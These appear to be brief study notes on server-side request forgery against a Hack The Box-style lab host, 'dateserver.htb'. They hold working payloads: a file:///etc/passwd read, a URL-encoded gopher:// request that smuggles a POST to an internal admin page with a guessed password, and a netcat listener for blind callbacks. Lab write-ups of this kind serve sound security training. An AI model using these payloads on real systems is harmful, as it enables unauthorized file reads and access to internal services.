___

![[Pasted image 20241004104444.png]]

# Fuzz endpoints

![[Pasted image 20241004105211.png]]

# LFI

```bash
file:///etc/passwd
```

# The gopher Protocol

There is no way to send this POST request using the `http://` URL scheme.

Instead, we can use the [gopher](https://datatracker.ietf.org/doc/html/rfc1436) URL scheme to send arbitrary bytes to a TCP socket. This protocol enables us to create a POST request by building the HTTP request ourselves.

```http
dateserver=gopher%3a//dateserver.htb%3a80/_POST%2520/admin.php%2520HTTP%252F1.1%250D%250AHost%3a%2520dateserver.htb%250D%250AContent-Length%3a%252013%250D%250AContent-Type%3a%2520application/x-www-form-urlencoded%250D%250A%250D%250Aadminpw%253Dadmin&date=2024-01-01
```

# Blind 

Point to our IP,

```bash
nc -lvnp 80
```


